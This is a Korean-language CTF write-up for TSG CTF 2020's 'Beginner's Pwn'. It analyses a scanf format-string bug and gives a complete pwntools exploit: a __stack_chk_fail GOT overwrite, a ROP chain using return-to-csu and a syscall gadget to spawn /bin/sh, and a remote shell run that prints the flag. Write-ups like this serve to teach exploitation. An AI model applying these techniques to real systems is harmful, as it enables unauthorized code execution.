# [WriteUp]TSG CTF 2020 - Beginner's Pwn

:black_nib:N1be(sj.dr.nibe@gmail.com)

---

## Overview

함수가 두 개밖에 없는 간단한 프로그램이다.

### readn()

```c
_BYTE *__fastcall readn(__int64 addr_buf, unsigned int len)
{
  _BYTE *result; // rax
  int cur_len; // [rsp+10h] [rbp-10h]
  unsigned int i; // [rsp+14h] [rbp-Ch]
  signed __int64 v5; // [rsp+18h] [rbp-8h]

  cur_len = 0;
  for ( i = 0; i < len; ++i )
  {
    v5 = sys_read(0, (char *)(i + addr_buf), 1uLL);// read one char
    cur_len += v5;                              // current length
    if ( v5 != 1 || *(_BYTE *)((unsigned int)(cur_len - 1) + addr_buf) == '\n' )
      break;
  }
  if ( !cur_len )
    exit(-1);
  result = (_BYTE *)*(unsigned __int8 *)((unsigned int)(cur_len - 1) + addr_buf);
  if ( (_BYTE)result == '\n' )
  {
    result = (_BYTE *)((unsigned int)(cur_len - 1) + addr_buf);
    *result = 0;                                // replace '\n' to '\x00'
  }
  return result;
}
```

매개변수로 버퍼의 주소와 길이를 받아서 그 버퍼에 문자열을 입력받는다. `syscall`로 한 글자씩 입력받으면서 개행 문자가 나오면 입력을 종료한다. 이 문자열의 마지막 문자가 `'\n'`이 아니라면 마지막 문자를 반환하고, 마지막 문자가 `'\n'`이라면 그것을 `'\x00'`으로 바꾸고 그 위치의 주소를 반환한다.

### main()

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[24]; // [rsp+0h] [rbp-20h] BYREF
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  readn((__int64)buf, 0x18u);
  __isoc99_scanf(buf);                          // FSB
  return 0;
}
```

`main()`에서는 `buf`에 `0x18`바이트의 문자열을 `readn()`으로 입력받는데, 특이한 점은 이 문자열을 format string으로 받아서 `scanf()`를 호출한다는 것이다. 여기서 FSB를 어떻게 잘 써봐야할 것 같다.

---

## Exploit plan

우선 가장 먼저 생각해볼 수 있는 방법은 `buf`에 `"%s"`를 넣어서 BOF를 발생시키는 것이다. 하지만 canary가 있기 때문에 단순히 그렇게는 return address에 접근할 수 없다.

```shell
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

보호기법을 확인해 보면 PIE가 꺼져 있고 Partial RELRO이다. canary가 오염되었을 때 호출되는 함수인 `__stack_chk_fail()`의 GOT를 덮을 수 있다면, 일부러 canary를 변조해서 실행 흐름을 조작할 수 있을 것 같다. `buf`의 어딘가에 GOT 주소를 넣어 두고 `"%s"`와 `"%d"`를 적절히 이용하면 GOT를 덮으면서 동시에 canary도 변조할 수 있다.

`printf("%7$d");`처럼 쓰면 64비트 기준으로, 레지스터 5개를 건너뛰고 `rsp`부터 2번째 공간(`rsp+0x8`)에 저장된 주소를 매개변수로 받아서 그 주소에 저장된 4바이트 값을 정수로 출력한다. 마찬가지로, `scanf("%7$d");`처럼 쓰면 `rsp+0x8`에 저장된 주소를 매개변수로 받아서, 그 주소에 4바이트 정수를 입력받는 코드가 된다.

### trigger FSB

```python
from pwn import *

r = process("./beginners_pwn")

stackchk_got = 0x404018 # GOT address of __stack_chk_fail()

payload = "%" + "s %7$d"
payload = payload.ljust(8, '\x00')
payload += p64(stackchk_got)
pause()
r.sendline(payload)

r.interactive()
```

위와 같이 payload를 보내 주었을 때 스택의 상태를 보자.

```shell
gdb-peda$ x/6gx $rsp
0x7ffe7c256b00:	0x0064243725207325	0x0000000000404018
0x7ffe7c256b10:	0x00007ffe7c256c00	0x1967a311fd2b1900
0x7ffe7c256b20:	0x0000000000401260	0x00007f73b589ab97
gdb-peda$ x/s $rsp
0x7ffe7c256b00:	"%s %7$d"
```

`rsp+0x8`에는 `__stack_chk_fail()`의 GOT 주소가 들어가 있고, 중간에 `NULL`이 있기 때문에 format string은 `"%s %7$d"`에서 끊긴다.

```shell
[----------------------------------registers-----------------------------------]
...
RSI: 0x7ffe7c256b10 --> 0x7ffe7c256c00 --> 0x1 
...
[-------------------------------------code-------------------------------------]
   0x40122b <main+40>:	lea    rax,[rbp-0x20]
   0x40122f <main+44>:	mov    rdi,rax
   0x401232 <main+47>:	mov    eax,0x0
=> 0x401237 <main+52>:	call   0x401040 <__isoc99_scanf@plt>
   0x40123c <main+57>:	mov    eax,0x0
   0x401241 <main+62>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x401245 <main+66>:	xor    rdx,QWORD PTR fs:0x28
   0x40124e <main+75>:	je     0x401255 <main+82>
Guessed arguments:
arg[0]: 0x7ffe7c256b00 --> 0x64243725207325 ('%s %7$d')
```

이 상태에서 `scanf()`에 문자열과 정수를 입력하면, 문자열은 `rsi`가 가리키는 위치에 들어가는데, 이 위치는 `readn()`에서 입력한 문자열 바로 뒤이고, 정수는 `__stack_chk_fail()`의 GOT에 들어갈 것이다. 문자열은 무한히 길게 입력할 수 있기 때문에 canary를 넘어서 return address까지 덮을 수 있고, ROP chain도 무제한으로 구성할 수 있다.

### GOT overwrite

`__stack_chk_fail()`의 GOT를 `main+82`로 덮어서, 그대로 `leave; ret`이 실행되도록 해 보자. canary check를 그냥 건너뛰는 느낌이다.

```python
from pwn import *

r = process("./beginners_pwn")

stackchk_got = 0x404018 # GOT address of __stack_chk_fail()
main = 0x401255 # address of "leave; ret" in main()

payload = "%" + "s %7$d"
payload = payload.ljust(8, '\x00')
payload += p64(stackchk_got)

r.sendline(payload)

payload = "A" * 0x18
payload += " "
payload += str(main)
pause()
r.sendline(payload)

r.interactive()
```

```shell
gdb-peda$ x/gx 0x404018
0x404018:	0x0000000000401255
```

GOT가 정상적으로 덮인 것을 확인할 수 있다. 하위 4바이트만 덮어도 되는 이유는 이전에 이 함수가 호출된 적이 없어서 아직 GOT가 libc의 주소로 채워져 있지 않기 때문이다.

```shell
gdb-peda$ x/6gx $rsp-0x10
0x7ffc0ceeb5f8:	0x4141414141414141	0x4141414141414141
0x7ffc0ceeb608:	0x00007fa113afeb00	0x0000002000000000
0x7ffc0ceeb618:	0x00007ffc0ceeb6e8	0x0000000100000000
```

`main()`에서 `ret`이 실행되기 직전의 스택 상태이다. 우리가 입력한 dummy가 return address 직전까지 채워져 있다. 이 다음부터 ROP chain을 잘 구성하면 될 것 같다.

### ROP

libc leak은 못 할 것 같고, `readn()` 내부에 `syscall` 가젯이 있으니 그걸 활용해야 할 것 같다. 필요한 건 `"/bin/sh"` 문자열과 레지스터를 세팅할 수 있는 가젯들이다. `rdi`와 `rsi`를 세팅하는 가젯은 쉽게 찾을 수 있는데, `rax`와 `rdx`를 세팅하는 가젯은 찾을 수가 없었다. `rax`는 `readn()`을 호출해서 그 반환값을 이용하고, `rdx`는 return-to-csu 기법을 사용해서 세팅하면 될 것 같다.

우선 `readn()`을 호출해서 BSS 영역에 `"/bin/sh"`를 쓰고, 마지막 문자를 `';'(0x3b)`로 끝내서 `rax`를 `0x3b`(`execve()`의 system call number)로 만든다. 그리고 return-to-csu를 수행해서 `rdi`는 `"/bin/sh"`의 주소로, `rsi`와 `rdx`는 0으로 세팅한 후 `syscall`을 실행하면 쉘을 획득할 수 있을 것이다.

---

## Exploit

```python
# exploit_beginners_pwn.py

from pwn import *

# r = process("./beginners_pwn")
r = remote("35.221.81.216", 30002)

stackchk_got = 0x404018 # GOT address of __stack_chk_fail()
main = 0x401255 # address of "leave; ret" in main()
pop_rdi = 0x4012c3 # address of "pop rdi; ret" gadget
pop_rsi_r15 = 0x4012c1 # address of "pop rsi; pop r15; ret" gadget
syscall = 0x40118f # address of "syscall" gadget
bss = 0x404100 # address of BSS section
readn = 0x401146 # address of readn()
csu1 = 0x4012ba
csu2 = 0x4012a0

payload = "%" + "s %7$d"
payload = payload.ljust(8, '\x00')
payload += p64(stackchk_got)

r.sendline(payload)

payload = "A" * 0x18

# ROP
payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(pop_rsi_r15)
payload += p64(0x11)
payload += p64(0)
payload += p64(readn)
# rax == 0x3b

payload += p64(csu1)
payload += p64(0) # rbx
payload += p64(0) # rbp
payload += p64(bss) # rdi
payload += p64(0) # rsi
payload += p64(0) # rdx
payload += p64(bss + 8) # r15
payload += p64(csu2)

payload += " "
payload += str(main)

r.sendline(payload)

r.send("/bin/sh\x00" + p64(syscall) + "\x3b")

r.interactive()
```

```shell
dr-nibe@ubuntu:~/TSG2020$ python exploit_beginners_pwn.py
[+] Opening connection to 35.221.81.216 on port 30002: Done
[*] Switching to interactive mode
$ whoami
user
$ cat flag
TSGCTF{w3lc0m3_70_756c7f2_60_4h34d_pwnpwn~}
```

